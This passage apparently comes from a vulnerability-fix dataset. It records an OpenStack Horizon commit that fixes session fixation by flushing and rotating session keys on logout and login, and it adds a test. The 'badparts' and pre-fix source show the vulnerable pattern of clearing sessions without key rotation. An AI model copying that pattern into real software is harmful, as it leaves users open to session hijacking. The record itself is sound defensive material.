NotAuthorized  # Redirect handled in middleware\n\n    if issubclass(exc_type, NOT_FOUND):\n        wrap = True\n        if not ignore and not handled:\n            LOG.debug(\"Not Found: %s\" % exc_value)\n            messages.error(request, message or exc_value)\n        if redirect:\n            raise Http302(redirect)\n        if not escalate:\n            return NotFound  # return to normal code flow\n\n    if issubclass(exc_type, RECOVERABLE):\n        wrap = True\n        if not ignore and not handled:\n            LOG.debug(\"Recoverable error: %s\" % exc_value)\n            messages.error(request, message or exc_value)\n        if redirect:\n            raise Http302(redirect)\n        if not escalate:\n            return RecoverableError  # return to normal code flow\n\n    # If we've gotten here, time to wrap and\/or raise our exception.\n    if wrap:\n        raise HandledException([exc_type, exc_value, exc_traceback])\n    raise exc_type, exc_value, exc_traceback\n"},"\/horizon\/users.py":{"changes":[{"diff":"\n         # If any of those keys are missing from the session it is\n         # overwhelmingly likely that we're dealing with an outdated session.\n         LOG.exception(\"Error while creating User from session.\")\n-        request.session.clear()\n+        request.user_logout()\n         raise exceptions.NotAuthorized(_(\"Your session has expired. \"\n                                          \"Please log in again.\")","add":1,"remove":1,"filename":"\/horizon\/users.py","badparts":["        request.session.clear()"],"goodparts":["        request.user_logout()"]},{"diff":"\n         # If any of those keys are missing from the session it is\n         # overwhelmingly likely that we're dealing with an outdated session.\n         LOG.exception(\"Error while creating User from session.\")\n-        request.session.clear()\n+        request.user_logout()\n         raise exceptions.NotAuthorized(_(\"Your session has expired. \"\n                                          \"Please log in again.\")","add":1,"remove":1,"filename":"\/horizon\/users.py","badparts":["        request.session.clear()"],"goodparts":["        request.user_logout()"]}],"source":"\n \"\"\" Classes and methods related to user handling in Horizon. \"\"\" import logging from django.utils.translation import ugettext as _ from horizon import api from horizon import exceptions LOG=logging.getLogger(__name__) def get_user_from_request(request): \"\"\" Checks the current session and returns a:class:`~horizon.users.User`. If the session contains user data the User will be treated as authenticated and the:class:`~horizon.users.User` will have all its attributes set. If not, the:class:`~horizon.users.User` will have no attributes set. If the session contains invalid data, :exc:`~horizon.exceptions.NotAuthorized` will be raised. \"\"\" if 'user_id' not in request.session: return User() try: return User(id=request.session['user_id'], token=request.session['token'], user=request.session['user_name'], tenant_id=request.session['tenant_id'], tenant_name=request.session['tenant'], service_catalog=request.session['serviceCatalog'], roles=request.session['roles'], request=request) except KeyError: LOG.exception(\"Error while creating User from session.\") request.session.clear() raise exceptions.NotAuthorized(_(\"Your session has expired. \" \"Please log in again.\")) class LazyUser(object): def __get__(self, request, obj_type=None): if not hasattr(request, '_cached_user'): request._cached_user=get_user_from_request(request) return request._cached_user class User(object): \"\"\" The main user class which Horizon expects. .. attribute:: token The id of the Keystone token associated with the current user\/tenant. .. attribute:: username The name of the current user. .. attribute:: tenant_id The id of the Keystone tenant for the current user\/token. .. attribute:: tenant_name The name of the Keystone tenant for the current user\/token. .. attribute:: service_catalog The ``ServiceCatalog`` data returned by Keystone. .. attribute:: roles A list of dictionaries containing role names and ids as returned by Keystone. .. attribute:: admin Boolean value indicating whether or not this user has admin privileges. Internally mapped to:meth:`horizon.users.User.is_admin`. \"\"\" def __init__(self, id=None, token=None, user=None, tenant_id=None, service_catalog=None, tenant_name=None, roles=None, authorized_tenants=None, request=None): self.id=id self.token=token self.username=user self.tenant_id=tenant_id self.tenant_name=tenant_name self.service_catalog=service_catalog self.roles=roles or[] self._authorized_tenants=authorized_tenants self._request=request def is_authenticated(self): \"\"\" Evaluates whether this:class:`.User` instance has been authenticated. Returns ``True`` or ``False``. \"\"\" return self.token @property def admin(self): return self.is_admin() def is_admin(self): \"\"\" Evaluates whether this user has admin privileges. Returns ``True`` or ``False``. \"\"\" for role in self.roles: if role['name'].lower()=='admin': return True return False def get_and_delete_messages(self): \"\"\" Placeholder function for parity with ``django.contrib.auth.models.User``. \"\"\" return[] @property def authorized_tenants(self): if self.is_authenticated() and self._authorized_tenants is None: try: token=self._request.session.get(\"unscoped_token\", self.token) authd=api.tenant_list_for_token(self._request, token) except: authd=[] LOG.exception('Could not retrieve tenant list.') self._authorized_tenants=authd return self._authorized_tenants @authorized_tenants.setter def authorized_tenants(self, tenant_list): self._authorized_tenants=tenant_list ","sourceWithComments":"# vim: tabstop=4 shiftwidth=4 softtabstop=4\n\n# Copyright 2012 United States Government as represented by the\n# Administrator of the National Aeronautics and Space Administration.\n# All Rights Reserved.\n#\n# Copyright 2012 Nebula, Inc.\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http:\/\/www.apache.org\/licenses\/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n\"\"\"\nClasses and methods related to user handling in Horizon.\n\"\"\"\n\nimport logging\n\nfrom django.utils.translation import ugettext as _\n\nfrom horizon import api\nfrom horizon import exceptions\n\n\nLOG = logging.getLogger(__name__)\n\n\ndef get_user_from_request(request):\n    \"\"\" Checks the current session and returns a :class:`~horizon.users.User`.\n\n    If the session contains user data the User will be treated as\n    authenticated and the :class:`~horizon.users.User` will have all\n    its attributes set.\n\n    If not, the :class:`~horizon.users.User` will have no attributes set.\n\n    If the session contains invalid data,\n    :exc:`~horizon.exceptions.NotAuthorized` will be raised.\n    \"\"\"\n    if 'user_id' not in request.session:\n        return User()\n    try:\n        return User(id=request.session['user_id'],\n                    token=request.session['token'],\n                    user=request.session['user_name'],\n                    tenant_id=request.session['tenant_id'],\n                    tenant_name=request.session['tenant'],\n                    service_catalog=request.session['serviceCatalog'],\n                    roles=request.session['roles'],\n                    request=request)\n    except KeyError:\n        # If any of those keys are missing from the session it is\n        # overwhelmingly likely that we're dealing with an outdated session.\n        LOG.exception(\"Error while creating User from session.\")\n        request.session.clear()\n        raise exceptions.NotAuthorized(_(\"Your session has expired. \"\n                                         \"Please log in again.\"))\n\n\nclass LazyUser(object):\n    def __get__(self, request, obj_type=None):\n        if not hasattr(request, '_cached_user'):\n            request._cached_user = get_user_from_request(request)\n        return request._cached_user\n\n\nclass User(object):\n    \"\"\" The main user class which Horizon expects.\n\n    .. attribute:: token\n\n        The id of the Keystone token associated with the current user\/tenant.\n\n    .. attribute:: username\n\n        The name of the current user.\n\n    .. attribute:: tenant_id\n\n        The id of the Keystone tenant for the current user\/token.\n\n    .. attribute:: tenant_name\n\n        The name of the Keystone tenant for the current user\/token.\n\n    .. attribute:: service_catalog\n\n        The ``ServiceCatalog`` data returned by Keystone.\n\n    .. attribute:: roles\n\n        A list of dictionaries containing role names and ids as returned\n        by Keystone.\n\n    .. attribute:: admin\n\n        Boolean value indicating whether or not this user has admin\n        privileges. Internally mapped to :meth:`horizon.users.User.is_admin`.\n    \"\"\"\n    def __init__(self, id=None, token=None, user=None, tenant_id=None,\n                    service_catalog=None, tenant_name=None, roles=None,\n                    authorized_tenants=None, request=None):\n        self.id = id\n        self.token = token\n        self.username = user\n        self.tenant_id = tenant_id\n        self.tenant_name = tenant_name\n        self.service_catalog = service_catalog\n        self.roles = roles or []\n        self._authorized_tenants = authorized_tenants\n        # Store the request for lazy fetching of auth'd tenants\n        self._request = request\n\n    def is_authenticated(self):\n        \"\"\"\n        Evaluates whether this :class:`.User` instance has been authenticated.\n        Returns ``True`` or ``False``.\n        \"\"\"\n        # TODO: deal with token expiration\n        return self.token\n\n    @property\n    def admin(self):\n        return self.is_admin()\n\n    def is_admin(self):\n        \"\"\"\n        Evaluates whether this user has admin privileges. Returns\n        ``True`` or ``False``.\n        \"\"\"\n        for role in self.roles:\n            if role['name'].lower() == 'admin':\n                return True\n        return False\n\n    def get_and_delete_messages(self):\n        \"\"\"\n        Placeholder function for parity with\n        ``django.contrib.auth.models.User``.\n        \"\"\"\n        return []\n\n    @property\n    def authorized_tenants(self):\n        if self.is_authenticated() and self._authorized_tenants is None:\n            try:\n                token = self._request.session.get(\"unscoped_token\", self.token)\n                authd = api.tenant_list_for_token(self._request, token)\n            except:\n                authd = []\n                LOG.exception('Could not retrieve tenant list.')\n            self._authorized_tenants = authd\n        return self._authorized_tenants\n\n    @authorized_tenants.setter\n    def authorized_tenants(self, tenant_list):\n        self._authorized_tenants = tenant_list\n"},"\/horizon\/views\/auth.py":{"changes":[{"diff":"\n \n def logout(request):\n     \"\"\" Clears the session and logs the current user out. \"\"\"\n-    request.session.clear()\n+    request.user_logout()\n     # FIXME(gabriel): we don't ship a view named splash\n     return shortcuts.redirect('spla","add":1,"remove":1,"filename":"\/horizon\/views\/auth.py","badparts":["    request.session.clear()"],"goodparts":["    request.user_logout()"]},{"diff":"\n \n def logout(request):\n     \"\"\" Clears the session and logs the current user out. \"\"\"\n-    request.session.clear()\n+    request.user_logout()\n     # FIXME(gabriel): we don't ship a view named splash\n     return shortcuts.redirect('spla","add":1,"remove":1,"filename":"\/horizon\/views\/auth.py","badparts":["    request.session.clear()"],"goodparts":["    request.user_logout()"]}],"source":"\n import logging from django import shortcuts from django.conf import settings from django.contrib.auth import REDIRECT_FIELD_NAME from django.utils.translation import ugettext as _ import horizon from horizon import api from horizon import exceptions from horizon import forms from horizon import users from horizon.base import Horizon from horizon.views.auth_forms import Login, LoginWithTenant, _set_session_data LOG=logging.getLogger(__name__) def user_home(request): \"\"\" Reversible named view to direct a user to the appropriate homepage. \"\"\" return shortcuts.redirect(horizon.get_user_home(request.user)) class LoginView(forms.ModalFormView): \"\"\" Logs in a user and redirects them to the URL specified by :func:`horizon.get_user_home`. \"\"\" form_class=Login template_name=\"horizon\/auth\/login.html\" def get_context_data(self, **kwargs): context=super(LoginView, self).get_context_data(**kwargs) redirect_to=self.request.REQUEST.get(REDIRECT_FIELD_NAME, \"\") context[\"redirect_field_name\"]=REDIRECT_FIELD_NAME context[\"next\"]=redirect_to return context def get_initial(self): initial=super(LoginView, self).get_initial() current_region=self.request.session.get('region_endpoint', None) requested_region=self.request.GET.get('region', None) regions=dict(getattr(settings, \"AVAILABLE_REGIONS\",[])) if requested_region in regions and requested_region !=current_region: initial.update({'region': requested_region}) return initial def switch_tenants(request, tenant_id): \"\"\" Swaps a user from one tenant to another using the unscoped token from Keystone to exchange scoped tokens for the new tenant. \"\"\" form, handled=LoginWithTenant.maybe_handle( request, initial={'tenant': tenant_id, 'username': request.user.username}) if handled: return handled unscoped_token=request.session.get('unscoped_token', None) if unscoped_token: try: token=api.token_create_scoped(request, tenant_id, unscoped_token) _set_session_data(request, token) user=users.User(users.get_user_from_request(request)) return shortcuts.redirect(Horizon.get_user_home(user)) except: exceptions.handle(request, _(\"You are not authorized for that tenant.\")) return shortcuts.redirect(\"horizon:auth_login\") def logout(request): \"\"\" Clears the session and logs the current user out. \"\"\" request.session.clear() return shortcuts.redirect('splash') ","sourceWithComments":"# vim: tabstop=4 shiftwidth=4 softtabstop=4\n\n# Copyright 2012 United States Government as represented by the\n# Administrator of the National Aeronautics and Space Administration.\n# All Rights Reserved.\n#\n# Copyright 2012 Nebula, Inc.\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http:\/\/www.apache.org\/licenses\/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n\nimport logging\n\nfrom django import shortcuts\nfrom django.conf import settings\nfrom django.contrib.auth import REDIRECT_FIELD_NAME\nfrom django.utils.translation import ugettext as _\n\nimport horizon\nfrom horizon import api\nfrom horizon import exceptions\nfrom horizon import forms\nfrom horizon import users\nfrom horizon.base import Horizon\nfrom horizon.views.auth_forms import Login, LoginWithTenant, _set_session_data\n\n\nLOG = logging.getLogger(__name__)\n\n\ndef user_home(request):\n    \"\"\" Reversible named view to direct a user to the appropriate homepage. \"\"\"\n    return shortcuts.redirect(horizon.get_user_home(request.user))\n\n\nclass LoginView(forms.ModalFormView):\n    \"\"\"\n    Logs in a user and redirects them to the URL specified by\n    :func:`horizon.get_user_home`.\n    \"\"\"\n    form_class = Login\n    template_name = \"horizon\/auth\/login.html\"\n\n    def get_context_data(self, **kwargs):\n        context = super(LoginView, self).get_context_data(**kwargs)\n        redirect_to = self.request.REQUEST.get(REDIRECT_FIELD_NAME, \"\")\n        context[\"redirect_field_name\"] = REDIRECT_FIELD_NAME\n        context[\"next\"] = redirect_to\n        return context\n\n    def get_initial(self):\n        initial = super(LoginView, self).get_initial()\n        current_region = self.request.session.get('region_endpoint', None)\n        requested_region = self.request.GET.get('region', None)\n        regions = dict(getattr(settings, \"AVAILABLE_REGIONS\", []))\n        if requested_region in regions and requested_region != current_region:\n            initial.update({'region': requested_region})\n        return initial\n\n\ndef switch_tenants(request, tenant_id):\n    \"\"\"\n    Swaps a user from one tenant to another using the unscoped token from\n    Keystone to exchange scoped tokens for the new tenant.\n    \"\"\"\n    form, handled = LoginWithTenant.maybe_handle(\n            request, initial={'tenant': tenant_id,\n                              'username': request.user.username})\n    if handled:\n        return handled\n\n    unscoped_token = request.session.get('unscoped_token', None)\n    if unscoped_token:\n        try:\n            token = api.token_create_scoped(request,\n                                            tenant_id,\n                                            unscoped_token)\n            _set_session_data(request, token)\n            user = users.User(users.get_user_from_request(request))\n            return shortcuts.redirect(Horizon.get_user_home(user))\n        except:\n            exceptions.handle(request,\n                              _(\"You are not authorized for that tenant.\"))\n\n    return shortcuts.redirect(\"horizon:auth_login\")\n\n\ndef logout(request):\n    \"\"\" Clears the session and logs the current user out. \"\"\"\n    request.session.clear()\n    # FIXME(gabriel): we don't ship a view named splash\n    return shortcuts.redirect('splash')\n"},"\/horizon\/views\/auth_forms.py":{"changes":[{"diff":"\n                 # If we get here we don't want to show a stack trace to the\n                 # user. However, if we fail here, there may be bad session\n                 # data that's been cached already.\n-                request.session.clear()\n+                request.user_logout()\n                 exceptions.handle(request,\n                                   message=_(\"An error occurred authenticating.\"\n                                             \" Please try again later.\"),\n","add":1,"remove":1,"filename":"\/horizon\/views\/auth_forms.py","badparts":["                request.session.clear()"],"goodparts":["                request.user_logout()"]},{"diff":"\n                 # If we get here we don't want to show a stack trace to the\n                 # user. However, if we fail here, there may be bad session\n                 # data that's been cached already.\n-                request.session.clear()\n+                request.user_logout()\n                 exceptions.handle(request,\n                                   message=_(\"An error occurred authenticating.\"\n                                             \" Please try again later.\"),\n","add":1,"remove":1,"filename":"\/horizon\/views\/auth_forms.py","badparts":["                request.session.clear()"],"goodparts":["                request.user_logout()"]}],"source":"\n \"\"\" Forms used for Horizon's auth mechanisms. \"\"\" import logging from django import shortcuts from django.conf import settings from django.contrib import messages from django.contrib.auth import REDIRECT_FIELD_NAME from django.utils.translation import ugettext as _ from keystoneclient import exceptions as keystone_exceptions from horizon import api from horizon import base from horizon import exceptions from horizon import forms from horizon import users LOG=logging.getLogger(__name__) def _set_session_data(request, token): request.session['serviceCatalog']=token.serviceCatalog request.session['tenant']=token.tenant['name'] request.session['tenant_id']=token.tenant['id'] request.session['token']=token.id request.session['user_name']=token.user['name'] request.session['user_id']=token.user['id'] request.session['roles']=token.user['roles'] class Login(forms.SelfHandlingForm): \"\"\" Form used for logging in a user. Handles authentication with Keystone, choosing a tenant, and fetching a scoped token token for that tenant. Redirects to the URL returned by:meth:`horizon.get_user_home` if successful. Subclass of:class:`~horizon.forms.SelfHandlingForm`. \"\"\" region=forms.ChoiceField(label=_(\"Region\"), required=False) username=forms.CharField(label=_(\"User Name\")) password=forms.CharField(label=_(\"Password\"), widget=forms.PasswordInput(render_value=False)) def __init__(self, *args, **kwargs): super(Login, self).__init__(*args, **kwargs) default_region=(settings.OPENSTACK_KEYSTONE_URL, \"Default Region\") regions=getattr(settings, 'AVAILABLE_REGIONS',[default_region]) self.fields['region'].choices=regions if len(regions)==1: self.fields['region'].initial=default_region[0] self.fields['region'].widget=forms.widgets.HiddenInput() def handle(self, request, data): endpoint=data.get('region', None) or settings.OPENSTACK_KEYSTONE_URL region_name=dict(self.fields['region'].choices)[endpoint] request.session['region_endpoint']=endpoint request.session['region_name']=region_name redirect_to=request.REQUEST.get(REDIRECT_FIELD_NAME, \"\") if data.get('tenant', None): try: token=api.token_create(request, data.get('tenant'), data['username'], data['password']) tenants=api.tenant_list_for_token(request, token.id) except: msg=_('Unable to authenticate for that project.') exceptions.handle(request, message=msg, escalate=True) _set_session_data(request, token) user=users.get_user_from_request(request) redirect=redirect_to or base.Horizon.get_user_home(user) return shortcuts.redirect(redirect) elif data.get('username', None): try: unscoped_token=api.token_create(request, '', data['username'], data['password']) except keystone_exceptions.Unauthorized: exceptions.handle(request, _('Invalid user name or password.')) except: request.session.clear() exceptions.handle(request, message=_(\"An error occurred authenticating.\" \" Please try again later.\"), escalate=True) request.session['unscoped_token']=unscoped_token.id request.user.username=data['username'] try: tenants=api.tenant_list_for_token(request, unscoped_token.id) except: exceptions.handle(request) tenants=[] if not tenants: messages.error(request, _('You are not authorized for any projects.') % {\"user\": data['username']}, extra_tags=\"login\") return while tenants: tenant=tenants.pop() try: token=api.token_create_scoped(request, tenant.id, unscoped_token.id) break except: exceptions.handle(request, ignore=True) token=None if token is None: raise exceptions.NotAuthorized( _(\"You are not authorized for any available projects.\")) _set_session_data(request, token) user=users.get_user_from_request(request) redirect=redirect_to or base.Horizon.get_user_home(user) return shortcuts.redirect(redirect) class LoginWithTenant(Login): \"\"\" Exactly like:class:`.Login` but includes the tenant id as a field so that the process of choosing a default tenant is bypassed. \"\"\" region=forms.ChoiceField(required=False) username=forms.CharField(max_length=\"20\", widget=forms.TextInput(attrs={'readonly': 'readonly'})) tenant=forms.CharField(widget=forms.HiddenInput()) ","sourceWithComments":"# vim: tabstop=4 shiftwidth=4 softtabstop=4\n\n# Copyright 2012 United States Government as represented by the\n# Administrator of the National Aeronautics and Space Administration.\n# All Rights Reserved.\n#\n# Copyright 2012 Nebula, Inc.\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http:\/\/www.apache.org\/licenses\/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n\n\"\"\"\nForms used for Horizon's auth mechanisms.\n\"\"\"\n\nimport logging\n\nfrom django import shortcuts\nfrom django.conf import settings\nfrom django.contrib import messages\nfrom django.contrib.auth import REDIRECT_FIELD_NAME\nfrom django.utils.translation import ugettext as _\nfrom keystoneclient import exceptions as keystone_exceptions\n\nfrom horizon import api\nfrom horizon import base\nfrom horizon import exceptions\nfrom horizon import forms\nfrom horizon import users\n\n\nLOG = logging.getLogger(__name__)\n\n\ndef _set_session_data(request, token):\n    request.session['serviceCatalog'] = token.serviceCatalog\n    request.session['tenant'] = token.tenant['name']\n    request.session['tenant_id'] = token.tenant['id']\n    request.session['token'] = token.id\n    request.session['user_name'] = token.user['name']\n    request.session['user_id'] = token.user['id']\n    request.session['roles'] = token.user['roles']\n\n\nclass Login(forms.SelfHandlingForm):\n    \"\"\" Form used for logging in a user.\n\n    Handles authentication with Keystone, choosing a tenant, and fetching\n    a scoped token token for that tenant. Redirects to the URL returned\n    by :meth:`horizon.get_user_home` if successful.\n\n    Subclass of :class:`~horizon.forms.SelfHandlingForm`.\n    \"\"\"\n    region = forms.ChoiceField(label=_(\"Region\"), required=False)\n    username = forms.CharField(label=_(\"User Name\"))\n    password = forms.CharField(label=_(\"Password\"),\n                               widget=forms.PasswordInput(render_value=False))\n\n    def __init__(self, *args, **kwargs):\n        super(Login, self).__init__(*args, **kwargs)\n        # FIXME(gabriel): When we switch to region-only settings, we can\n        # remove this default region business.\n        default_region = (settings.OPENSTACK_KEYSTONE_URL, \"Default Region\")\n        regions = getattr(settings, 'AVAILABLE_REGIONS', [default_region])\n        self.fields['region'].choices = regions\n        if len(regions) == 1:\n            self.fields['region'].initial = default_region[0]\n            self.fields['region'].widget = forms.widgets.HiddenInput()\n\n    def handle(self, request, data):\n        # For now we'll allow fallback to OPENSTACK_KEYSTONE_URL if the\n        # form post doesn't include a region.\n        endpoint = data.get('region', None) or settings.OPENSTACK_KEYSTONE_URL\n        region_name = dict(self.fields['region'].choices)[endpoint]\n        request.session['region_endpoint'] = endpoint\n        request.session['region_name'] = region_name\n\n        redirect_to = request.REQUEST.get(REDIRECT_FIELD_NAME, \"\")\n\n        if data.get('tenant', None):\n            try:\n                token = api.token_create(request,\n                                         data.get('tenant'),\n                                         data['username'],\n                                         data['password'])\n                tenants = api.tenant_list_for_token(request, token.id)\n            except:\n                msg = _('Unable to authenticate for that project.')\n                exceptions.handle(request,\n                                  message=msg,\n                                  escalate=True)\n            _set_session_data(request, token)\n            user = users.get_user_from_request(request)\n            redirect = redirect_to or base.Horizon.get_user_home(user)\n            return shortcuts.redirect(redirect)\n\n        elif data.get('username', None):\n            try:\n                unscoped_token = api.token_create(request,\n                                                  '',\n                                                  data['username'],\n                                                  data['password'])\n            except keystone_exceptions.Unauthorized:\n                exceptions.handle(request,\n                                  _('Invalid user name or password.'))\n            except:\n                # If we get here we don't want to show a stack trace to the\n                # user. However, if we fail here, there may be bad session\n                # data that's been cached already.\n                request.session.clear()\n                exceptions.handle(request,\n                                  message=_(\"An error occurred authenticating.\"\n                                            \" Please try again later.\"),\n                                  escalate=True)\n\n            # Unscoped token\n            request.session['unscoped_token'] = unscoped_token.id\n            request.user.username = data['username']\n\n            # Get the tenant list, and log in using first tenant\n            # FIXME (anthony): add tenant chooser here?\n            try:\n                tenants = api.tenant_list_for_token(request, unscoped_token.id)\n            except:\n                exceptions.handle(request)\n                tenants = []\n\n            # Abort if there are no valid tenants for this user\n            if not tenants:\n                messages.error(request,\n                               _('You are not authorized for any projects.') %\n                                {\"user\": data['username']},\n                               extra_tags=\"login\")\n                return\n\n            # Create a token.\n            # NOTE(gabriel): Keystone can return tenants that you're\n            # authorized to administer but not to log into as a user, so in\n            # the case of an Unauthorized error we should iterate through\n            # the tenants until one succeeds or we've failed them all.\n            while tenants:\n                tenant = tenants.pop()\n                try:\n                    token = api.token_create_scoped(request,\n                                                    tenant.id,\n                                                    unscoped_token.id)\n                    break\n                except:\n                    # This will continue for recognized Unauthorized\n                    # exceptions from keystoneclient.\n                    exceptions.handle(request, ignore=True)\n                    token = None\n            if token is None:\n                raise exceptions.NotAuthorized(\n                    _(\"You are not authorized for any available projects.\"))\n\n            _set_session_data(request, token)\n            user = users.get_user_from_request(request)\n        redirect = redirect_to or base.Horizon.get_user_home(user)\n        return shortcuts.redirect(redirect)\n\n\nclass LoginWithTenant(Login):\n    \"\"\"\n    Exactly like :class:`.Login` but includes the tenant id as a field\n    so that the process of choosing a default tenant is bypassed.\n    \"\"\"\n    region = forms.ChoiceField(required=False)\n    username = forms.CharField(max_length=\"20\",\n                       widget=forms.TextInput(attrs={'readonly': 'readonly'}))\n    tenant = forms.CharField(widget=forms.HiddenInput())\n"}},"msg":"Fixes lp978896 -- Session fixation security fix\n\nRotates session tokens on logout, and properly clears sessions\nto prevent data leakage.\n\nChange-Id: I52d03576d07b1e023a7730857156d0da1887b1df"}},"https:\/\/github.com\/AMfalme\/Horizon_Openstack":{"041b1c44c7d6cf5429505067c32f8f35166a8bab":{"url":"https:\/\/api.github.com\/repos\/AMfalme\/Horizon_Openstack\/commits\/041b1c44c7d6cf5429505067c32f8f35166a8bab","html_url":"https:\/\/github.com\/AMfalme\/Horizon_Openstack\/commit\/041b1c44c7d6cf5429505067c32f8f35166a8bab","sha":"041b1c44c7d6cf5429505067c32f8f35166a8bab","keyword":"session fixation prevent","diff":"diff --git a\/horizon\/exceptions.py b\/horizon\/exceptions.py\nindex 7af8a0a69..778719e3d 100644\n--- a\/horizon\/exceptions.py\n+++ b\/horizon\/exceptions.py\n@@ -203,7 +203,7 @@ class indicating the type of exception that was encountered will be\n     if issubclass(exc_type, UNAUTHORIZED):\n         if ignore:\n             return NotAuthorized\n-        request.session.clear()\n+        request.user_logout()\n         if not handled:\n             LOG.debug(\"Unauthorized: %s\" % exc_value)\n             # We get some pretty useless error messages back from\ndiff --git a\/horizon\/middleware.py b\/horizon\/middleware.py\nindex f20c1f09e..f141ff362 100644\n--- a\/horizon\/middleware.py\n+++ b\/horizon\/middleware.py\n@@ -49,6 +49,15 @@ def process_request(self, request):\n \n         Adds a :class:`~horizon.users.User` object to ``request.user``.\n         \"\"\"\n+        # A quick and dirty way to log users out\n+        def user_logout(request):\n+            if hasattr(request, '_cached_user'):\n+                del request._cached_user\n+            # Use flush instead of clear, so we rotate session keys in\n+            # addition to clearing all the session data\n+            request.session.flush()\n+        request.__class__.user_logout = user_logout\n+\n         request.__class__.user = users.LazyUser()\n         request.horizon = {'dashboard': None, 'panel': None}\n \ndiff --git a\/horizon\/tests\/auth_tests.py b\/horizon\/tests\/auth_tests.py\nindex ba1647777..9f295d0c0 100644\n--- a\/horizon\/tests\/auth_tests.py\n+++ b\/horizon\/tests\/auth_tests.py\n@@ -18,6 +18,8 @@\n #    License for the specific language governing permissions and limitations\n #    under the License.\n \n+import time\n+\n from django import http\n from django.core.urlresolvers import reverse\n from keystoneclient import exceptions as keystone_exceptions\n@@ -220,3 +222,53 @@ def test_logout(self):\n \n         self.assertRedirectsNoFollow(res, reverse('splash'))\n         self.assertNotIn(KEY, self.client.session)\n+\n+    def test_session_fixation(self):\n+        session_ids = []\n+        form_data = {'method': 'Login',\n+                     'region': 'http:\/\/localhost:5000\/v2.0',\n+                     'password': self.user.password,\n+                     'username': self.user.name}\n+\n+        self.mox.StubOutWithMock(api, 'token_create')\n+        self.mox.StubOutWithMock(api, 'tenant_list_for_token')\n+        self.mox.StubOutWithMock(api, 'token_create_scoped')\n+\n+        aToken = self.tokens.unscoped_token\n+        bToken = self.tokens.scoped_token\n+\n+        api.token_create(IsA(http.HttpRequest), \"\", self.user.name,\n+                         self.user.password).AndReturn(aToken)\n+        api.tenant_list_for_token(IsA(http.HttpRequest),\n+                                  aToken.id).AndReturn([self.tenants.first()])\n+        api.token_create_scoped(IsA(http.HttpRequest),\n+                                self.tenant.id,\n+                                aToken.id).AndReturn(bToken)\n+\n+        api.token_create(IsA(http.HttpRequest), \"\", self.user.name,\n+                         self.user.password).AndReturn(aToken)\n+        api.tenant_list_for_token(IsA(http.HttpRequest),\n+                                  aToken.id).AndReturn([self.tenants.first()])\n+        api.token_create_scoped(IsA(http.HttpRequest),\n+                                self.tenant.id,\n+                                aToken.id).AndReturn(bToken)\n+        self.mox.ReplayAll()\n+\n+        res = self.client.get(reverse('horizon:auth_login'))\n+        self.assertEqual(res.cookies.get('sessionid'), None)\n+        res = self.client.post(reverse('horizon:auth_login'), form_data)\n+        session_ids.append(res.cookies['sessionid'].value)\n+\n+        self.assertEquals(self.client.session['user_name'],\n+                          self.user.name)\n+        self.client.session['foobar'] = 'MY TEST VALUE'\n+        res = self.client.get(reverse('horizon:auth_logout'))\n+        session_ids.append(res.cookies['sessionid'].value)\n+        self.assertEqual(len(self.client.session.items()), 0)\n+        # Sleep for 1 second so the session values are different if\n+        # using the signed_cookies backend.\n+        time.sleep(1)\n+        res = self.client.post(reverse('horizon:auth_login'), form_data)\n+        session_ids.append(res.cookies['sessionid'].value)\n+        # Make sure all 3 session id values are different\n+        self.assertEqual(len(session_ids), len(set(session_ids)))\ndiff --git a\/horizon\/users.py b\/horizon\/users.py\nindex f5dcde81a..6e6be8e5a 100644\n--- a\/horizon\/users.py\n+++ b\/horizon\/users.py\n@@ -59,7 +59,7 @@ def get_user_from_request(request):\n         # If any of those keys are missing from the session it is\n         # overwhelmingly likely that we're dealing with an outdated session.\n         LOG.exception(\"Error while creating User from session.\")\n-        request.session.clear()\n+        request.user_logout()\n         raise exceptions.NotAuthorized(_(\"Your session has expired. \"\n                                          \"Please log in again.\"))\n \ndiff --git a\/horizon\/views\/auth.py b\/horizon\/views\/auth.py\nindex b48f24a65..5120eed76 100644\n--- a\/horizon\/views\/auth.py\n+++ b\/horizon\/views\/auth.py\n@@ -96,6 +96,6 @@ def switch_tenants(request, tenant_id):\n \n def logout(request):\n     \"\"\" Clears the session and logs the current user out. \"\"\"\n-    request.session.clear()\n+    request.user_logout()\n     # FIXME(gabriel): we don't ship a view named splash\n     return shortcuts.redirect('splash')\ndiff --git a\/horizon\/views\/auth_forms.py b\/horizon\/views\/auth_forms.py\nindex 287448685..2ebecfcda 100644\n--- a\/horizon\/views\/auth_forms.py\n+++ b\/horizon\/views\/auth_forms.py\n@@ -77,6 +77,16 @@ def __init__(self, *args, **kwargs):\n             self.fields['region'].widget = forms.widgets.HiddenInput()\n \n     def handle(self, request, data):\n+        if 'user_name' in request.session:\n+            if request.session['user_name'] != data['username']:\n+                # To avoid reusing another user's session, create a\n+                # new, empty session if the existing session\n+                # corresponds to a different authenticated user.\n+                request.session.flush()\n+        # Always cycle the session key when viewing the login form to\n+        # prevent session fixation\n+        request.session.cycle_key()\n+\n         # For now we'll allow fallback to OPENSTACK_KEYSTONE_URL if the\n         # form post doesn't include a region.\n         endpoint = data.get('region', None) or settings.OPENSTACK_KEYSTONE_URL\n@@ -116,7 +126,7 @@ def handle(self, request, data):\n                 # If we get here we don't want to show a stack trace to the\n                 # user. However, if we fail here, there may be bad session\n                 # data that's been cached already.\n-                request.session.clear()\n+                request.user_logout()\n                 exceptions.handle(request,\n                                   message=_(\"An error occurred authenticating.\"\n                                             \" Please try again 